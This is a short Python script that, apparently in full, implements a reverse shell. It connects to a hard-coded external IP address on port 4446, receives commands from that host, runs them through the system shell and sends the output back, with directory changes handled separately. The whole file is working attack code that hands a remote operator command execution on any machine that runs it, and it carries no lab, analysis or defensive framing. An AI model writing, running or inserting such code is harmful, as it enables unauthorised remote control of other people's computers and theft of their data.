import socket
import subprocess
import os

def reverse_shell():
    host = "212.132.64.73"
    port = 4446

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((host, port))
        s.send(b"[+] Connection established!\n")

        while True:
            command = s.recv(1024).decode("utf-8")
            if command.lower() in ("exit", "quit"):
                break
            if command.startswith("cd "):
                try:
                    os.chdir(command.strip()[3:])
                    s.send(b"Changed directory\n")
                except Exception as e:
                    s.send(str(e).encode())
                continue
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            except subprocess.CalledProcessError as e:
                output = e.output
            s.send(output)
    except Exception as e:
        print(f"Connection failed: {e}")
    finally:
        s.close()

if __name__ == "__main__":
    reverse_shell()
